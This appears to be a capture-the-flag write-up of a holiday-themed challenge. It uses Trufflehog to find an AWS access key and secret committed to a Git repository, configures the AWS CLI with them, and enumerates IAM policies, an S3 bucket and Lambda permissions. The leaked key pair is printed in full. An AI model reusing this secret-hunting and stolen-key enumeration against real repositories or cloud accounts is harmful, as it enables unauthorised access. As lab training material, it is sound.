# Trouflehog

Use Trufflehog to find credentials in the Gitlab instance at https://haugfactory.com/asnowball/aws_scripts.git.
Configure these credentials for us-east-1 and then run:
$ aws sts get-caller-identity

## Investigating GIT repository

Luckily there is an in your face example on how to use Trufflehog on Git repositories straight on its homepage: https://github.com/trufflesecurity/trufflehog

```bash
elf@2fb235392470:~$ trufflehog git https://haugfactory.com/asnowball/aws_scripts.git
🐷🔑🐷  TruffleHog. Unearth your secrets. 🐷🔑🐷

Found unverified result 🐷🔑❓
Detector Type: AWS
Decoder Type: PLAIN
Raw result: AKIAAIDAYRANYAHGQOHD
Timestamp: 2022-09-07 07:53:12 -0700 -0700
Line: 6
Commit: 106d33e1ffd53eea753c1365eafc6588398279b5
File: put_policy.py
Email: asnowball <alabaster@northpolechristmastown.local>
Repository: https://haugfactory.com/asnowball/aws_scripts.git

Found unverified result 🐷🔑❓
Detector Type: Gitlab
Decoder Type: PLAIN
Raw result: add-a-file-using-the-
Line: 14
Commit: 2c77c1e0a98715e32a277859864e8f5918aacc85
File: README.md
Email: alabaster snowball <alabaster@northpolechristmastown.local>
Repository: https://haugfactory.com/asnowball/aws_scripts.git
Timestamp: 2022-09-06 19:54:48 +0000 UTC

Found unverified result 🐷🔑❓
Detector Type: Gitlab
Decoder Type: BASE64
Raw result: add-a-file-using-the-
File: README.md
Email: alabaster snowball <alabaster@northpolechristmastown.local>
Repository: https://haugfactory.com/asnowball/aws_scripts.git
Timestamp: 2022-09-06 19:54:48 +0000 UTC
Line: 14
Commit: 2c77c1e0a98715e32a277859864e8f5918aacc85

elf@2fb235392470:~$ clear
```

We now have a few commits and files to inspect:

* 106d33e1ffd53eea753c1365eafc6588398279b5 : put_policy.py
* 2c77c1e0a98715e32a277859864e8f5918aacc85 : README.md. Trufflehog reacted to two curious instances in the same commit.

Cloning the repository for further inspection

```bash
elf@2fb235392470:~$ git clone https://haugfactory.com/asnowball/aws_scripts.git
Cloning into 'aws_scripts'...
remote: Enumerating objects: 64, done.
remote: Total 64 (delta 0), reused 0 (delta 0), pack-reused 64
Unpacking objects: 100% (64/64), 23.83 KiB | 1.32 MiB/s, done.
elf@2fb235392470:~$
```

### Investigating commit 106d33e1ffd53eea753c1365eafc6588398279b5

```bash
elf@3b5734341d8f:~$ cd aws_scripts/
elf@3b5734341d8f:~/aws_scripts$ git checkout 106d33e1ffd53eea753c1365eafc6588398279b5
elf@3b5734341d8f:~/aws_scripts$ cat put_policy.py 
import boto3
import json


iam = boto3.client('iam',
    region_name='us-east-1',
    aws_access_key_id="AKIAAIDAYRANYAHGQOHD",
    aws_secret_access_key="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",
)
# arn:aws:ec2:us-east-1:accountid:instance/*
response = iam.put_user_policy(
    PolicyDocument='{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":["ssm:SendCommand"],"Resource":["arn:aws:ec2:us-east-1:748127089694:instance/i-0415bfb7dcfe279c5","arn:aws:ec2:us-east-1:748127089694:document/RestartServices"]}]}',
    PolicyName='AllAccessPolicy',
    UserName='nwt8_test',
)
elf@3b5734341d8f:~/aws_scripts$
```

### Investigating commit 106d33e1ffd53eea753c1365eafc6588398279b5

```bash
elf@3b5734341d8f:~/aws_scripts$ git checkout 2c77c1e0a98715e32a277859864e8f5918aacc85
HEAD is now at 2c77c1e Initial commit
elf@3b5734341d8f:~/aws_scripts$ more README.md
```

The README.md contained nothing interesting.

## Configuring AWS

As pr. assignment instruction, went on configuring AWS with information found in commit 106d33e1ffd53eea753c1365eafc6588398279b5

```bash
elf@3b5734341d8f:~/aws_scripts$ aws configure
AWS Access Key ID [None]: AKIAAIDAYRANYAHGQOHD
AWS Secret Access Key [None]: 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
Default region name [None]: us-east-1
Default output format [None]: 
elf@3b5734341d8f:~/aws_scripts$ aws sts get-caller-identity
{
    "UserId": "AIDAJNIAAQYHIAAHDDRA",
    "Account": "602123424321",
    "Arn": "arn:aws:iam::602123424321:user/haug"
}
elf@3b5734341d8f:~/aws_scripts$
```
Then another assignment showed up:

```
Managed (think: shared) policies can be attached to multiple users. Use the AWS CLI to find any policies attached to your user.
The aws iam command to list attached user policies can be found here:
https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html
Hint: it is NOT list-user-policies.
```

The "haug" username was found in previous step:

```bash
elf@3b5734341d8f:~/aws_scripts$ aws iam list-attached-user-policies --user-name haug
{
    "AttachedPolicies": [
        {
            "PolicyName": "TIER1_READONLY_POLICY",
            "PolicyArn": "arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY"
        }
    ],
    "IsTruncated": false
}
elf@3b5734341d8f:~/aws_scripts$
```

Another assignment popped up

```
Now, view or get the policy that is attached to your user.
The aws iam command to get a policy can be found here:
https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html
```

```bash
elf@3b5734341d8f:~/aws_scripts$ aws iam get-policy --policy-arn arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY
{
    "Policy": {
        "PolicyName": "TIER1_READONLY_POLICY",
        "PolicyId": "ANPAYYOROBUERT7TGKUHA",
        "Arn": "arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY",
        "Path": "/",
        "DefaultVersionId": "v1",
        "AttachmentCount": 11,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "Description": "Policy for tier 1 accounts to have limited read only access to certain resources in IAM, S3, and LAMBDA.",
        "CreateDate": "2022-06-21 22:02:30+00:00",
        "UpdateDate": "2022-06-21 22:10:29+00:00",
        "Tags": []
    }
}
elf@3b5734341d8f:~/aws_scripts$
```

The assignments kept coming

```
Attached policies can have multiple versions. View the default version of this policy.
The aws iam command to get a policy version can be found here:
https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html
```

```bash
elf@3b5734341d8f:~/aws_scripts$ aws iam get-policy-version --policy-arn "arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY" --version-id v1
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Action": [
                        "lambda:ListFunctions",
                        "lambda:GetFunctionUrlConfig"
                    ],
                    "Resource": "*"
                },
                {
                    "Effect": "Allow",
                    "Action": [
                        "iam:GetUserPolicy",
                        "iam:ListUserPolicies",
                        "iam:ListAttachedUserPolicies"
                    ],
                    "Resource": "arn:aws:iam::602123424321:user/${aws:username}"
                },
                {
                    "Effect": "Allow",
                    "Action": [
                        "iam:GetPolicy",
                        "iam:GetPolicyVersion"
                    ],
                    "Resource": "arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY"
                },
                {
                    "Effect": "Deny",
                    "Principal": "*",
                    "Action": [
                        "s3:GetObject",
                        "lambda:Invoke*"
                        ],
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v1",
        "IsDefaultVersion": false,
        "CreateDate": "2022-06-21 22:02:30+00:00"
    }
}
elf@3b5734341d8f:~/aws_scripts$ 
```

```
Inline policies are policies that are unique to a particular identity or resource. Use the AWS CLI to list the inline policies associated with your user. 
The aws iam command to list user policies can be found here:
https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html
Hint: it is NOT list-attached-user-policies.
```

```bash
elf@3b5734341d8f:~/aws_scripts$ aws iam list-user-policies --user-name haug
{
    "PolicyNames": [
        "S3Perms"
    ],
    "IsTruncated": false
}
elf@3b5734341d8f:~/aws_scripts$
```

```
Now, use the AWS CLI to get the only inline policy for your user. 
The aws iam command to get a user policy can be found here:
https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html
```

```bash
elf@3b5734341d8f:~/aws_scripts$ aws iam get-user-policy --user-name haug --policy-name S3Perms
{
    "UserPolicy": {
        "UserName": "haug",
        "PolicyName": "S3Perms",
        "PolicyDocument": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Action": [
                        "s3:ListObjects"
                    ],
                    "Resource": [
                        "arn:aws:s3:::smogmachines3",
                        "arn:aws:s3:::smogmachines3/*"
                    ]
                }
            ]
        }
    },
    "IsTruncated": false
}
elf@3b5734341d8f:~/aws_scripts$
```

```
The inline user policy named S3Perms disclosed the name of an S3 bucket that you have permissions to list objects. 
List those objects! 
The aws s3api command to list objects in an s3 bucket can be found here:
https://awscli.amazonaws.com/v2/documentation/api/latest/reference/s3api/index.html
```

```bash
elf@3b5734341d8f:~/aws_scripts$ aws s3api list-objects --bucket "smogmachines3"
{
    "IsTruncated": false,
    "Marker": "",
    "Contents": [
        {
            "Key": "coal-fired-power-station.jpg",
            "LastModified": "2022-09-23 20:40:44+00:00",
            "ETag": "\"1c70c98bebaf3cff781a8fd3141c2945\"",
            "Size": 59312,
            "StorageClass": "STANDARD",
            "Owner": {
                "DisplayName": "grinchum",
                "ID": "15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60"
            }
        },
        {
            "Key": "industry-smog.png",
            "LastModified": "2022-09-23 20:40:47+00:00",
            "ETag": "\"c0abe5cb56b7a33d39e17f430755e615\"",
            "Size": 272528,
            "StorageClass": "STANDARD",
            "Owner": {
                "DisplayName": "grinchum",
                "ID": "15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60"
            }
        },
        {
            "Key": "pollution-smoke.jpg",
            "LastModified": "2022-09-23 20:40:43+00:00",
            "ETag": "\"465b675c70d73027e13ffaec1a38beec\"",
            "Size": 33064,
            "StorageClass": "STANDARD",
            "Owner": {
                "DisplayName": "grinchum",
                "ID": "15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60"
            }},
        {
            "Key": "pollution.jpg",
            "LastModified": "2022-09-23 20:40:45+00:00",
            "ETag": "\"d40d1db228c9a9b544b4c552df712478\"",
            "Size": 81775,
            "StorageClass": "STANDARD",
            "Owner": {
                "DisplayName": "grinchum",
                "ID": "15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60"
            }
        },
        {
            "Key": "power-station-smoke.jpg",
            "LastModified": "2022-09-23 20:40:48+00:00",
            "ETag": "\"2d7a8c8b8f5786103769e98afacf57de\"",
            "Size": 45264,
            "StorageClass": "STANDARD",
            "Owner": {
                "DisplayName": "grinchum",
                "ID": "15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60"
            }
        },
        {
            "Key": "smog-power-station.jpg",
            "LastModified": "2022-09-23 20:40:46+00:00",
            "ETag": "\"0e69b8d53d97db0db9f7de8663e9ec09\"",
            "Size": 32498,
            "StorageClass": "STANDARD",
            "Owner": {
                "DisplayName": "grinchum",
                "ID": "15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60"
                }
        }
    ],
    "Name": "smogmachines3",
    "Prefix": "",
    "MaxKeys": 1000,
    "EncodingType": "url"
}
```

```
The attached user policy provided you several Lambda privileges. Use the AWS CLI to list Lambda functions.
The aws lambda command to list functions can be found here:
https://awscli.amazonaws.com/v2/documentation/api/latest/reference/lambda/index.html
```

